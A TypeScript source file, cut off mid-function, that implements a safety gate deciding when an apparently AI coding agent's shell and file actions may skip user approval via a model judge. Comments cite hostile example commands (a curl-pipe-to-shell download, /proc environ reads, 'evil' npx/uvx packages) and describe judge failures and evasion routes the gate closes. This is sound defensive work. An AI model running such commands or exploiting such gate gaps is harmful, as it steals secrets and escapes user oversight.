const ABSOLUTE_REASON_RE = /^\[Absolute\]\s*(.+)$/;
function absoluteBarHits(reasons: string[]): string[] {
  return [...new Set(
    reasons.map((r) => ABSOLUTE_REASON_RE.exec(r)?.[1]).filter((l): l is string => l !== undefined),
  )];
}

/** A pattern-table CLASS label (not an absolute bar) — the half D-b hands to
 * the judge. Evaluator-side reasons (`[Tool]`, `[System]`, `[Risk]`, …) are
 * NOT class labels and keep their conservative behavior everywhere. */
const CLASS_LABEL_REASON_RE = /^\[Pattern\]\s/;

/**
 * The download-and-execute bar is about REMOTE code. The 2026-10-19 ledger
 * replay turned up the FP that motivated this exemption: two real rows of
 * `curl -s localhost:8080/v1/status | python3 -c 'json.load(sys.stdin)'` — a
 * local API answer being parsed — flipped from auto-allow to an absolute stop.
 * Locality is already decided, fail-closed, by the egress check's
 * `isLoopbackEgress`; the bar reuses that answer instead of inventing a second
 * one. A non-loopback host keeps the bar (curl https://x.sh | sh).
 * Coupled to the label text — see config/dangerous-patterns.ts.
 */
const REMOTE_EXEC_LABEL_RE = /download & execute/;

/**
 * The statically knowable leading dirs of a location text — the place §4.2
 * can anchor a judge report. Cuts at the first dynamic part (a variable, a
 * substitution, a glob, an unresolved marker). A relative text has no anchor
 * of its own and returns "": the report cannot vouch for a location whose
 * base is itself unknown, so such a fact is answered by the per-token path
 * resolver instead (§4.2 amendment, 3.41.0 — see MissAnswers).
 */
const DYNAMIC_SEGMENT_RE = /[$`*[\]{}<>\\]/;
export function staticPrefixOf(raw: string): string {
  const text = expandTilde(raw);
  const body = text.startsWith(`${OPAQUE_VAR_DIR}/`)
    ? `/${text.slice(OPAQUE_VAR_DIR.length + 1)}`
    : text;
  if (!path.isAbsolute(body)) return "";
  const comps = body.split("/").slice(1);
  let i = 0;
  while (i < comps.length && comps[i] !== "" && !DYNAMIC_SEGMENT_RE.test(comps[i])) i++;
  if (i === 0) return ""; // nothing static before the first dynamic part
  return path.normalize(`/${comps.slice(0, i).join("/")}`);
}

/** Pseudo-fs files that hold secrets — not in `warnPaths` (name-based) but the
 *  same class §4.3 refuses to judge (the Oct-18 ledger has a real stop on
 *  `/proc/<pid>/environ`, and the pseudo-fs read class is what this floor now
 *  lets intent through). */
const PROC_SECRET_RE = /\/proc\/[^/]+\/(environ|cmdline)\b/;

/**
 * The §4 guards on intent-over-miss (docs/dspa-intent-floor.md). Returns the
 * faults that KEEP the stop; empty means the verdict may clear it. The
 * verdict's own authority (approve, risk ≤ medium) is the caller's — the same
 * policy every other auto-allow applies. Designed against the sampled path
 * report (§4 evidence), which invented a `/usr/bin/ether-wake` for a text's
 * `/usr/sbin/…`, concretized `/proc/0/smaps_rollup`, mangled a URL into a
 * path, and reported 2 of 5 dirs: every guard here constrains what the report
 * must CONTAIN, never what it claims.
 */
/**
 * §4.2's answer, per shape of the fact (3.41.0 amendment).
 * A fact with a static anchor is answered by the stage-2 report naming it.
 * A fact with NO anchor (`$rc`, `$f` from an unprovable in-list) has no
 * static text a report could match, so its only admissible answer is the
 * path resolver's OWN per-token answer (`judge/path-resolver.ts`) — and
 * every dir in that answer must land inside the read bar. A flat report
 * never vouches for an unanchored token: `cat $fi notes.md` names
 * notes.md, and letting that stand in for `$fi` is the omission hole §4.2
 * exists to close. An answer outside the bar keeps the stop (D-g: bars are
 * absolute); no answer at all keeps the stop (fail closed).
 */
export interface MissAnswers {
  /** token → absolute dirs, from the path resolver for THIS command. */
  resolved?: ResolutionMap;
  /** The manual read bar (`makeManualBar`) the answer must land inside. */
  inBar?: (p: string) => boolean;
}

function anchorAnswer(miss: MissFact, reported: string[], answers: MissAnswers): string[] {
  if (miss.prefix) {
    return reported.filter((p) => p === miss.prefix || p.startsWith(`${miss.prefix}/`));
  }
  const dirs = answers.resolved?.get(miss.token) ?? [];
  if (dirs.length === 0 || !answers.inBar) return [];
  return dirs.every((d) => answers.inBar!(d)) ? dirs : [];
}

/**
 * §4.2's match set: the reported paths that ANSWER this miss. Exported so the
 * ledger records exactly the evidence the guard accepted (§7 `judgePaths`),
 * not a separate guess about the same report.
 */
export function answeredMissPaths(
  miss: MissFact,
  reported: string[],
  answers: MissAnswers = {},
): string[] {
  return anchorAnswer(miss, reported, answers);
}

export function intentGuardFaults(
  misses: MissFact[],
  reported: string[],
  answers: MissAnswers = {},
): string[] {
  const faults: string[] = [];
  for (const m of misses) {
    // §4.1 destructive never rides on a miss: the parse puts this unnamed
    // location in a WRITE operand position (`> $X/log`, `mv a $UNBOUND`), so
    // an intent verdict cannot bound the damage. The rm/unlink/rmdir/
    // truncate/`find -delete`/`xargs rm` shapes are already absolute stops
    // from §6 D-c — this is the redirect/move half of the same rule. D-g
    // generalizes it: a CONCRETE out-of-bar write operand is never relaxable
    // either, so only the D-h base-write proxy (nothing written yet — the
    // floor stops on the new base itself) may go to intent.
    if (m.role === "write" && m.kind !== "base-write") {
      faults.push(`write effect at an unnamed location (${m.token})`);
      continue;
    }
    // §4.3 credential ceiling — the static parts of the location name a
    // credential class: intent cannot unlock what the floor would warn on.
    const cred = isPathWarnedResolved(m.token, m.token);
    if (cred.warned || PROC_SECRET_RE.test(m.token)) {
      faults.push(`credential class (${cred.matchedRule ?? "/proc secrets"})`);
      continue;
    }
    // §4.2 answer-that-token: a judge that never acknowledged the location
    // class cannot vouch for it — omission is the one way the substitution
    // turns a stop into a silent wrong-location allow. This is also why an
    // EMPTY report never clears a miss (D-h: not the `writes: []` variant).
    const answered = anchorAnswer(m, reported, answers);
    if (answered.length === 0) {
      if (m.prefix) {
        faults.push(`no reported path under ${m.prefix}`);
      } else {
        const dirs = answers.resolved?.get(m.token) ?? [];
        const outside = dirs.filter((d) => !answers.inBar?.(d));
        faults.push(
          dirs.length === 0
            ? `unanchored location unanswerable (${m.token})`
            : `reported path outside the read bar (${outside.slice(0, 2).join(", ")})`,
        );
      }
    }
  }
  return [...new Set(faults)];
}

export async function checkDspaGate(
  pd: PromptData,
  store: Store,
): Promise<DspaGateResult> {
  if (pd.type === "tool") {
    if (pd.gate === "file" || pd.gate === "consent") {
      return {
        ok: false,
        reason: `tool ${pd.gate} never auto-allows (session grants cover its repetition)`,
        advisory: true,
      };
    }
    // exec: the payload is the whole model — no deterministic floor applies
    // (it's opaque by construction); the two-stage judge decides (D11).
    // egress (content-classes T1): the outgoing payload IS the effect (C1)
    // — the judge sees the full args (packet) and the cascade decides.
    return { ok: true };
  }

  if (pd.type === "file") {
    // D3 (docs/dspa-redesign.md): a write into a session-granted dir is
    // judgeable — the user trusted the dir, so the outside-base stop does
    // not apply; the two-stage judge decides on the content. Ungranted
    // outside-cwd writes stay on the floor (Q1). Reads are never judged.
    // D11: the floor's bar is the MANUAL write bar — a write manual mode
    // auto-allows (session-granted dir or file, config-allowed, project-pi)
    // is judgeable: the location is already user-trusted, the content is
    // judged in full (the D3 probe converts that auto-allow to this prompt).
    // Only truly outside-base writes stop (Q1: scope is the user's call).
    const writeBarOk =
      pd.isWriteOp && insideManualWriteBar(store, pd.resolved, pd.cwd);
    // Name the violated base (the session cwd), not outsideDir — the
    // target's own parent (the grant-offer unit): `outside base (/a/b/config)`
    // read as though the file were outside its parent dir. The grant dir
    // stays visible in the same log line (promptDir/target).
    if (!writeBarOk && pd.outsideDir) {
      return { ok: false, reason: `outside base (session ${pd.cwd})`, advisory: true };
    }
    if (pd.warnedRule) return { ok: false, reason: `credential pattern (${pd.warnedRule})`, advisory: true };
    return { ok: true };
  }

  // bash — trust the analysis the decision was made from (single analysis
  // per decision); re-analyze only for hand-constructed prompt data.
  const analysis =
    pd.analysis ??
    (await analyzeCommand(pd.command, pd.cwd, {
      isInsideAllowedDir: (p) => store.isInsideAllowedDir(p, "read"),
      getConfirmedResolution: (t) => store.getConfirmedResolution(t),
    }));
  // T2 (content-classes): an unparseable command is JUDGEABLE — the packet
  // carries the full raw text plus the parse-error flag; the checks below
  // run on the (degraded) segments as best effort, the judge reads the raw
  // text. Q1's policy stops (credentials, egress, outside base, sentinels)
  // still apply wherever they can see.

  // D11 (2026-08-26 re-alignment): the floor's bar is the MANUAL bar — the
  // same predicate the analysis uses for prompt.outsidePaths
  // (getOutsideCwdPaths): cwd + session grants (read checks both sets) +
  // config-allowed paths + trusted scripts. A location manual mode
  // auto-allows is not a scope violation — the judge reviews it; only what
  // manual would prompt for (outside base) stops here (Q1, re-confirmed).
  const isInsideManualBar = makeManualBar(store, pd.cwd);

  // §6 D-c (docs/dspa-intent-floor.md): delete scale, computed in the analysis
  // (one pass, so the judge packet and the prompt see the same number). The
  // shapes with no countable reach — a computed or root-level target, a target
  // sitting above the working directory, `find -delete`, `find -exec rm`,
  // `xargs`-fed rm, `truncate` with a glob operand — never become judgeable,
  // and neither does a delete reaching more than DELETE_SCALE_ABSOLUTE entries
  // outside the temp dirs: the judge has no location to weigh and no way back
  // at that scale. Inside the temp dirs the count is informational (the note
  // rides the packet) and the judge weighs it.
  const ds = analysis.deleteScale;
  if (ds.absolute.length > 0) {
    return { ok: false, reason: ds.absolute.slice(0, 2).join("; ").slice(0, 120), advisory: true };
  }

  let outsideExempt = new Set<string>();
  const hasRm = analysis.segments.some(isRmSegment);
  if (hasRm) {
    // rm carve-out: bounded, explicit targets only (see header).
    const rm = checkRmTargets(analysis.segments, pd.cwd, isInsideManualBar);
    if (rm.reason) return { ok: false, reason: rm.reason, advisory: true };
    outsideExempt = rm.exempt;
    // Non-rm dangerous reasons still stop the auto-allow: the carve-out
    // covers only the rm's own footprint (recursive/forced delete, its
    // self-written redirect/pipe). D-b (2026-10-19) narrowed what counts
    // here: a pattern-table CLASS label (`[Pattern] python …`) is a name the
    // judge rules on, not a bar, and an rm next to one is the same shape the
    // non-rm path already judges — so class labels no longer block the
    // carve-out. Absolute bars are NOT exempted (the `absoluteBarHits` check
    // below stops them) and evaluator-side reasons (`[Tool]`, `[System]`, …)
    // keep blocking, as they did before.
    const otherDanger = analysis.risk.reasons.filter(
      (r) => !RM_RISK_REASON_RE.test(r) && !CLASS_LABEL_REASON_RE.test(r),
    );
    if (otherDanger.length > 0) {
      return { ok: false, reason: `dangerous: ${otherDanger.join("; ").slice(0, 120)}`, advisory: true };
    }
  }
  // D-g: the absolute bars. Everything else the pattern tables label is a class
  // name the judge rules on (D1); these entries destroy state the user cannot
  // walk back, or escape the permission model — the intent path has no location
  // to rule on, so no verdict clears them (mkfs, mount, dd, shutdown/reboot,
  // eval, the irreversible git forms, download-and-execute).
  const bars = absoluteBarHits(analysis.risk.reasons).filter(
    (l) => !(REMOTE_EXEC_LABEL_RE.test(l) && isLoopbackEgress(pd.command, analysis.segments)),
  );
  if (bars.length > 0) {
    return {
      ok: false,
      reason: `absolute bar (${bars.slice(0, 3).join("; ")})`,
      advisory: true,
    };
  }
  // Non-rm: unsafe patterns and risk reasons are JUDGEABLE (D1) — inline
  // scripts, redirects, pipes, subshells, file-modification patterns. The
  // packet carries the full command text (heredoc bodies included) plus
  // halter's analysis digest; the judge decides. An OBSCURED command
  // position (variable indirection) is judgeable too (T2) — the packet
  // carries the full raw text plus the obfuscation flag. The floor checks
  // below (credentials, network, outside base) still apply.
  if (pd.credentialRule) {
    // An unverifiable glob is a verification failure, not a credential match
    // — name it honestly (the prompt renders the same distinction).
    if (isGlobUnverified(pd.credentialRule)) {
      return { ok: false, reason: `unverifiable glob (${globUnverifiedToken(pd.credentialRule)})`, advisory: true };
    }
    return { ok: false, reason: `credential pattern (${pd.credentialRule})`, advisory: true };
  }
  // D10 (docs/dspa-redesign.md): a fetchable run form names a package that
  // may be FETCHED (and executed) on cache miss — the same fetch class the
  // floor stops for fetch forms. Trust is per bare package name, granted
  // only by the user's "Trust" click on the stop's prompt. Local run forms
  // (npm run, uv run, bun <script>) execute repo-visible code and are never
  // gated. The parser flattens subshell contents into segments, so
  // `out=$(npx foo)` is seen too; only opaque indirection (eval, $f) stays
  // judge-only (the obscured-position check above). segmentFetchPackage
  // resolves inline env prefixes and wrapper delegation first
  // (`FOO=bar npx evil`, `env npx evil` are npx evil) — the gate must not
  // be evadable by prefixing.
  const untrusted: string[] = [];
  const unvettedOptions: string[] = [];
  for (let i = 0; i < analysis.segments.length; i++) {
    const seg = analysis.segments[i] ?? "";
    const ff = segmentFetchPackage(seg);
    if (!ff) continue;
    // G7: a select flag (`npx --package=pkg cmd`, `uvx --from pkg cmd`) moves
    // the fetch: the trailing word is a command INSIDE the selected package(s),
    // so every one of them needs trust — `npx --package=evil-pkg tsc` used to
    // pass on a grant for a package the command never fetched. A selected value
    // the shell decides at run time names no package at all: nothing covers it.
    if (ff.opaque) { untrusted.push(`${ff.first} <not a name yet>`); continue; }
    const bad = ff.pkgs.filter((p) => !store.hasTrustedPackage(p));
    if (bad.length > 0) { untrusted.push(`${ff.first} ${bad.join(" ")}`); continue; }
    // Trusted package, but uv's own options decide something else: an
    // interpreter from outside the project (`uvx -p /tmp/evil/python tsc`) or an
    // install set (`uvx --with evil tsc`) is not the package the Trust click was
    // about.
    if (!segmentFetchOptionsOk(seg, analysis.effectiveCwds[i] ?? null)) {
      unvettedOptions.push(ff.first);
    }
  }
  if (untrusted.length > 0) {
    const uniq = [...new Set(untrusted)];
    return {
      ok: false,
      reason: `untrusted package (${uniq.slice(0, 3).join(", ")})`,
      // The prompt offers "Trust: <pkg> (session)" — computed from the
      // same analysis (BashPromptData.fetchableForms), not carried here.
      advisory: true,
    };
  }
  if (unvettedOptions.length > 0) {
    return {
      ok: false,
      reason: `unvetted run-form option (${[...new Set(unvettedOptions)].slice(0, 3).join(", ")})`,
      advisory: true,
    };
  }
  // Full-filesystem scan (find /, grep -rn /): a dedicated stop reason —
  // conspicuous in plain sight, and the generic outside-base reason
  // ("touches paths outside base (/)") understates what the command does.
  for (const seg of analysis.segments) {
    const scan = rootScanTarget(seg);
    if (scan) return { ok: false, reason: `full filesystem scan (${scan} /)`, advisory: true };
  }
  // D14 (docs/dspa-redesign.md) + D-a (docs/dspa-intent-floor.md): network
  // egress. Only the outbound half of the split is a floor stop — an inbound
  // fetch (`git fetch`, a curl/wget GET) is judgeable: nothing local leaves the
  // machine and the downloaded file is minted as a write operand, so it faces
  // the write bar. Loopback-only curl/wget stays judgeable whatever it sends (a
  // local call cannot exfiltrate). Uploads, copies to a remote and the opaque
  // forms stop — but advisory: the judge runs both stages and its verdict
  // renders in the prompt as input to the user's allow/deny (the stop stands;
  // egress is never auto-allowed).
  const net = networkHit(pd.command, analysis.segments);
  if (net && net.kind !== "fetch" && !isLoopbackEgress(pd.command, analysis.segments)) {
    return { ok: false, reason: `network egress (${net.token})`, advisory: true };
  }
  // prompt.outsidePaths already applied the manual bar (above): what's left
  // is exactly what manual mode would prompt for — the scope class (Q1:
  // the user's call, judgeable only after an Always-for-dir grant). The D7
  // 5ef1f0f session-base re-filter is reverted by D11: config-allowed
  // concrete paths (`cat > /tmp/x`) are judgeable, matching their
  // opaque-resolved counterparts under the same bar. Sentinels pass through
  // unchanged and keep the D7 resolution below.
  // D18 (2026-09-12, extended D21 2026-09-13): write-mode base access.
  // baseAccessPath flags the re-based base as an undifferentiated touch, and
  // the read bar above admits read-allowed bases (~/.pi is read-allowed in
  // config). A segment that WRITES its base — a bare output redirect, opaque
  // inline code (heredoc / -c / -e) the floor does not interpret (D1), or a
  // write verb with a base-resolving target (D21) — must face the WRITE bar,
  // exactly like a file-op write (the file branch above). Bases inside the
  // session cwd are the working set (the file branch never stops a write into
  // cwd); unknown bases (cd $D) are already stopped by the D7 sentinel pass.
  // D-d (docs/dspa-intent-floor.md §8 step 1): the WRITE bar also faces the
  // floor's OWN write operands. `analysis.writePaths` — every write-role
  // operand the parser minted (`sed -i f`, `cp a d`, `mkdir d`, `> f`) — was
  // checked only against the READ bar, and the manual read bar admits dirs
  // that carry no write grant (`~/.pi` is read-allowed so skills and
  // extensions load). A bash write into pi's own config therefore stopped only
  // if a dangerous pattern happened to match it; manual mode has asked this
  // question since G3 (`outsideWriteDirs`/`needsWriteApproval`,
  // decide/bash-rules.ts) and the floor never consulted it.
  // In-cwd targets are the working set (as with the bases above); /dev/* never
  // mint (SAFE_SYSTEM_PATHS); the rm carve-out's create-then-delete set (D8)
  // stays exempt — the net effect of that pair is nothing; opaque/sentinel
  // operands belong to the D7 resolution pass below.
  // 3.40 step 4: this now runs BEFORE that pass, because a stop there must
  // know whether the command ALSO has a concrete out-of-bar write operand —
  // the one write shape D-g never hands to intent — and because the sentinel
  // stop carries the same writeOutside, so its prompt offers `Allow writes`
  // (D21's one-prompt rule, extended to that reason).
  const normBase = path.resolve(expandTilde(pd.cwd));
  const baseOut: string[] = [];
  for (let i = 0; i < analysis.parsedSegments.length; i++) {
    const base = analysis.effectiveCwds[i];
    if (base === null || isInsideCwd(base, normBase)) continue;
    if (!baseWriteAccess(analysis.parsedSegments[i])) continue;
    if (!insideManualWriteBar(store, base, pd.cwd) && !baseOut.includes(base)) baseOut.push(base);
  }
  const writeOpDirs: string[] = [];
  for (const p of analysis.writePaths ?? []) {
    if (outsideExempt.has(p) || p.includes("$") || p.includes("`")) continue;
    if (p.startsWith(OPAQUE_VAR_DIR) || p.startsWith(UNKNOWN_CWD_MARKER)) continue;
    if (isInsideCwd(p, normBase) || insideManualWriteBar(store, p, pd.cwd)) continue;
    writeOpDirs.push(path.dirname(p));
  }
  const writeOutside = [...new Set([...baseOut, ...writeOpDirs])];
  const outside = (analysis.prompt.outsidePaths ?? []).filter((p) => !outsideExempt.has(p));
  // D7: resolve the sentinels (see d7ResolveSentinel). Concrete outside
  // locations stop (naming the dir for a one-time grant); unprovable
  // locations stop too — as typed MISS facts, which the fall-through's
  // intent pass may clear (3.40.0, docs/dspa-intent-floor.md §3).
  const bounds = cdBaseBounds(analysis.parsedSegments, pd.cwd, analysis.assignments);
  const resolvedOutside: string[] = [];
  const confirmedOutside: Array<{ token: string; dirs: string[] }> = [];
  // Each unbound opaque ref contributes TWO entries: the raw reference text
  // (e.g. /base/$e/f) and its marker twin (<unresolved-var>/base/$e/f —
  // never inside the bar). The marker is the location authority for the ref:
  // a confirmed resolution judges the real dirs; without one, the floor
  // stops. The raw text alone stops nothing — it is a shell token, not a
  // filesystem location (its value can be anything). marker → token comes
  // from the analysis's own unresolved list (the marker string alone is
  // ambiguous for absolute tokens — path.join dropped their leading slash).
  const tokenByMarker = new Map<string, string>();
  const markerByToken = new Map<string, string>();
  for (const u of analysis.prompt.unresolved) {
    tokenByMarker.set(u.marker, u.token);
    markerByToken.set(u.token, u.marker);
  }
  const markersInOutside = new Set(
    outside.filter((p) => p.startsWith(OPAQUE_VAR_DIR)),
  );
  // §3 (docs/dspa-intent-floor.md): the miss facts this stop can carry. They
  // are built from the outside SET, not from the resolution loop below, so a
  // stop in the middle of that loop still reports EVERY unknown location the
  // command has — a guard that covers only some of the unknowns is the hole
  // §4.2 exists to close.
  const concreteOutside = outside.filter(
    (p) =>
      !p.startsWith(OPAQUE_VAR_DIR) &&
      !p.startsWith(UNKNOWN_CWD_MARKER) &&
      !markersInOutside.has(markerByToken.get(p) ?? ""),
  );
  const writeRoleAt = (p: string): boolean =>
    (analysis.writePaths ?? []).some(
      (w) => w === p || w.startsWith(`${p}/`) || p.startsWith(`${w}/`),
    );
  // 3.41.0, §4.1 over UNANCHORED misses: the parse records no `writePaths`
  // entry for an unresolvable redirect target (`echo hi > $OUT` — there is no
  // location to record, and `baseWriteAccess` skips it too, since an expansion
  // makes it not a bare name under the base). So the WRITE role has to come
  // from the redirect structure itself; without this the token would arrive as
  // a READ miss and an in-bar resolver answer would clear a write to a name
  // the floor never saw. fd duplication (`2>&1`, `>&3`) is not a write.
  const redirectTargets: string[] = [];
  for (const seg of analysis.parsedSegments) {
    const toks = tokenizeSegment(seg.text);
    for (let i = 0; i < toks.length; i++) {
      const mOut = toks[i].match(OUT_REDIRECT_RE);
      const target = mOut
        ? (mOut[2] !== "" ? mOut[2] : (toks[i + 1] ?? null))
        : BARE_REDIRECT_RE.test(toks[i]) && toks[i].includes(">")
          ? (toks[i + 1] ?? null)
          : null;
      if (!target || target.startsWith("&") || /^\d+$/.test(target)) continue;
      redirectTargets.push(target);
    }
  }
  // §7: the confirmed resolutions in effect for this command (the same set
  // `judge/paths.ts` treats as the floor's own knowledge).
  const confirmedDirs = analysis.prompt.unresolved.flatMap(
    (u) => store.getConfirmedResolution(u.token) ?? [],
  );
  const confirmedPriorAt = (p: string): boolean =>
    confirmedDirs.some((d) => p === d || p.startsWith(`${d}/`) || d.startsWith(`${p}/`));
  // §4.2's anchor for a CONCRETE location text. The judge's report is sanitized
  // through `resolvePathReal` (`judge/paths.ts`, `toAbs`), so an anchor threaded
  // textually from the parse — a `cd` base (`/etc` on a Mac, where the report
  // says `/private/etc/…`) — has to be realpath'd to be matchable at all; the
  // D-h base-write proxy was unreachable on a Darwin host for exactly this
  // reason. Markers are left alone: they name no real location. (3.41.0)
  const anchorOf = (p: string): string =>
    staticPrefixOf(
      p.startsWith(OPAQUE_VAR_DIR) || p.startsWith(UNKNOWN_CWD_MARKER)
        ? p
        : resolvePathReal(p, pd.cwd),
    );
  const outsideFacts = (paths: string[]): MissFact[] =>
    [...new Set(paths)].map((p) => ({
      kind: "outside-path",
      token: p,
      prefix: anchorOf(p),
      role: writeRoleAt(p) ? "write" : "read",
      confirmedPrior: confirmedPriorAt(p),
    }));
  // D-h: the D18 base-write PROXY is a miss (a body the floor does not
  // interpret); a concrete write operand outside the write bar is not — D-g
  // keeps every out-of-bar WRITE on the floor.
  const baseFacts: MissFact[] = baseOut.map((b) => ({
    kind: "base-write",
    token: b,
    // The base is threaded textually from the `cd` (`cd /etc` → `/etc`, while
    // the judge reports `/private/etc/…` on a Mac); the anchor must be matched
    // where the report is, so it is realpath'd (3.41.0).
    prefix: anchorOf(b),
    role: "write" as const,
    confirmedPrior: confirmedPriorAt(b),
  }));
  const unresolvedFact = (token: string | null, raw: string): MissFact => {
    const t = token ?? raw;
    const marker = token ? markerByToken.get(token) ?? null : null;
    const isWrite =
      (analysis.writePaths ?? []).some(
        (w) => (marker !== null && w.includes(marker)) || w.includes(t),
      ) ||
      redirectTargets.some(
        (r) => r.includes(t) || (marker !== null && r.includes(marker)),
      );
    return {
      kind: "unresolved",
      token: t,
      prefix: staticPrefixOf(t),
      role: isWrite ? "write" : "read",
      confirmedPrior: token ? store.getConfirmedResolution(token) !== null : false,
    };
  };
  // An unanchorable location IS a miss now (3.41 G-a): the guard answers it
  // from the path resolver's per-token report and requires that answer to
  // land in-bar, so a token with nothing static about it is judged on what it
  // ACTUALLY points at instead of prompting every run. What still drops the
  // whole set is a concrete out-of-bar WRITE operand (D-g: the write bar is
  // absolute, intent never relaxes it).
  const withMisses = (facts: MissFact[]) => {
    // The same location can arrive twice (a concrete ref and its resolution);
    // one fact per location keeps the guard report and the ledger honest.
    const all: MissFact[] = [];
    const seen = new Set<string>();
    for (const f of [...facts, ...outsideFacts(concreteOutside), ...baseFacts]) {
      const k = `${f.kind}|${f.token}`;
      if (seen.has(k)) continue;
      seen.add(k);
      all.push(f);
    }
    if (writeOpDirs.length > 0) return {};
    return { misses: all };
  };
  for (const p of outside) {
    if (!p.startsWith(OPAQUE_VAR_DIR) && !p.startsWith(UNKNOWN_CWD_MARKER)) {
      // Its marker twin is in the outside set → the sentinel pass handles
      // this ref (confirmed dirs judge it; unconfirmed stops it).
      if (markersInOutside.has(markerByToken.get(p) ?? "")) continue;
      resolvedOutside.push(p);
      continue;
    }
    const token = p.startsWith(OPAQUE_VAR_DIR) ? tokenByMarker.get(p) ?? null : null;
    const r = d7ResolveSentinel(p, pd.cwd, isInsideManualBar, bounds, {
      token,
      confirmed: token ? store.getConfirmedResolution(token) : null,
    });
    if (r.kind === "outside") {
      resolvedOutside.push(...r.paths);
      if (r.confirmedToken) confirmedOutside.push({ token: r.confirmedToken, dirs: r.paths });
    } else if (r.kind === "stop") {
      return {
        ok: false,
        reason: r.reason,
        advisory: true,
        ...withMisses([unresolvedFact(token, p)]),
        ...(writeOutside.length > 0 ? { writeOutside } : {}),
      };
    }
    // inside → drop
  }
  // Opaque refs re-resolved under the floor's (manual) bar — defensive twin
  // of the analysis-layer resolution above: a value the bar allows (e.g.
  // /tmp via config) is dropped, a concrete outside path stops (D7).
  const floor = resolveOpaqueRefs(
    analysis.opaque,
    analysis.parsedSegments,
    analysis.effectiveCwds,
    analysis.assignments,
    pd.cwd,
    isInsideManualBar,
    analysis.unsets,
  );
  resolvedOutside.push(...floor.paths);
  // D12 confirmed resolutions: the analysis layer already made a confirmed
  // sentinel concrete (its outside dirs are in resolvedOutside above, or it
  // dropped out entirely when all in-bar). Surface any confirmed token whose
  // dirs fall outside the bar so the prompt labels them `confirmed` and the
  // paths grant covers them — the same bar (isInsideManualBar) the analysis
  // used, so this agrees with what the floor just resolved.
  for (const u of analysis.prompt.unresolved) {
    const confirmed = store.getConfirmedResolution(u.token);
    if (!confirmed) continue;
    const out = confirmed.filter((d) => !isInsideManualBar(d));
    if (out.length > 0 && !confirmedOutside.some((c) => c.token === u.token)) {
      confirmedOutside.push({ token: u.token, dirs: out });
    }
  }
  // writeOutside (the D18 base proxies and the D-d write operands) is computed
  // above, before the D7 sentinel pass — the note there says why it moved.
  if (resolvedOutside.length > 0) {
    const shown = [...new Set(resolvedOutside)].slice(0, 2);
    // Compound reason (D21): when the command also writes a base, name it —
    // the stop carries the write option, and a read-only-sounding title
    // would leave it looking out of place.
    const reason = writeOutside.length > 0
      ? `touches paths outside base (${shown.join(", ")}); writes ${writeOutside.slice(0, 2).join(", ")}`
      : `touches paths outside base (${shown.join(", ")})`;
    return {
      ok: false,
      reason,
      advisory: true,
      ...(confirmedOutside.length > 0 ? { confirmedOutside } : {}),
      ...(writeOutside.length > 0 ? { writeOutside } : {}),
      ...withMisses(outsideFacts(resolvedOutside)),
    };
  }
  if (writeOutside.length > 0) {
    return {
      ok: false,
      reason: `write outside base (${writeOutside.slice(0, 2).join(", ")})`,
      advisory: true,
      writeOutside,
      ...(writeOpDirs.length === 0 && baseFacts.length > 0 && !baseFacts.some((f) => f.prefix === "")
        ? { misses: baseFacts }
        : {}),
    };
  }
  return { ok: true };
}

// ── rm carve-out ────────────────────────────────────────────────────────

/** Risk reasons that belong to rm's own footprint (or the self-write that
 * feeds it) — filtered out in the rm branch instead of blocking. Everything
 * else in analysis.risk.reasons blocks the judge. The strings are the rm
 * footprint reasons actually emitted — system-evaluator (recursive/forced
 * delete, mass deletion, entire-tree/home targets) and the dangerous-
 * pattern hit `[Pattern] rm (any file deletion)` — plus the medium-noise
 * self-write entries (pipe operator, input/output redirection, tee's file-
 * writing flag) that appear in legitimate shapes (`echo … | tee f && rm f`);
 * the dangerous pipeline forms have their own, non-matching reasons ("pipe
 * to a shell", per-stage evaluator hits). Deliberately NOT a bare word match
 * — `git rm (…)` and `aws s3 rm (…)` are non-rm dangerous ops and must
 * block the carve-out. New reason strings fail safe (block → prompt). */
const RM_RISK_REASON_RE =
  /\brecursive delete\b|\bforced delete\b|mass deletion|entire (?:tree|home) deleted|\[Pattern\] rm \(|shell (?:input|output) redirection|pipe operator|tee \(file writing\)|\bdeletes \d+\+? files\b/i;
/** A location only the shell knows at run time: a variable, a substitution,
 * a backtick. No location for the bar to check — absolute. */
const RM_COMPUTED_TARGET_RE = /[$`]/;
/** Glob metacharacters in a target: judgeable shape, counted by D-c. */
const RM_GLOB_TARGET_RE = /[*?[{]/;
/** A target that never denotes one concrete path — used for the self-write
 *  bookkeeping only (a glob/var operand is not a create-then-delete pair).
 *  D-c removed it as the rm TARGET bar: a rooted glob is judgeable there. */
const RM_NOT_CONCRETE_RE = /[*?[~$`]/;

/**
 * D8 (docs/dspa-redesign.md): an explicit, non-recursive rm of a
 * world-scratch target directly under /tmp is judgeable — the judge sees
 * the full text, and /tmp is the conventional scratch area (`rm -f
 * /tmp/probe.log` cleanup stopped 4 of 26 dspa prompts in the 2026-08-24
 * log). Recursive and variable targets never reach it (the shape checks fail
 * first); a glob reaches it on its STATIC ROOT (D-c); a pure tilde is expanded
 * to its concrete path before that check; /tmp itself is not a target.
 */
function isTmpScratchTarget(resolved: string, recursive: boolean): boolean {
  return !recursive && resolved.startsWith("/tmp/");
}

/**
 * The tokens a segment OPERATES with live in analysis/delete-scale.ts
 * (`operativeTokens`) — the carve-out's target checks and the delete-scale
 * scan read the same tokenization: quote-aware, env prefixes stripped,
 * wrapper delegation resolved (`env rm …` is an rm).
 */

function isRmSegment(seg: string): boolean {
  const first = operativeTokens(seg)[0]?.split("/").pop()?.toLowerCase();
  return first === "rm";
}

const SELF_WRITE_CMDS = new Set(["tee", "touch", "mkdir"]);

/** Strip one pair of matching quotes from a raw token. */
function cleanToken(t: string): string {
  if (t.length >= 2 && ((t[0] === '"' && t.endsWith('"')) || (t[0] === "'" && t.endsWith("'")))) {
    return t.slice(1, -1);
  }
  return t;
}

/** /dev/* targets are not real writes (>/dev/null, /dev/stderr, …). */
function isDevNullish(resolved: string): boolean {
  return resolved === "/dev" || resolved.startsWith("/dev/");
}

/**
 * Validate every rm target in the command. Returns a block reason, or the
 * create-then-delete set (self-written paths that are also rm targets) to
 * exempt from the outside-base check.
 */
function checkRmTargets(
  segments: string[],
  cwd: string,
  isInsideBase: (p: string) => boolean,
): { reason: string | null; exempt: Set<string> } {
  // ORDER matters for the carve-out (create-THEN-delete): a self-write
  // counts only for rm targets in LATER segments, and a write is "cleaned"
  // only by an rm in a LATER segment. `rm f && echo x > f` (delete-then-
  // create) leaves f existing outside the base and gets no exemption — the
  // contract (header, D8) is a write "in an earlier segment AND rms".
  const writtenBefore = new Set<string>(); // writes from strictly earlier segments
  const writesAt = new Map<string, number[]>(); // path → writing segment indices
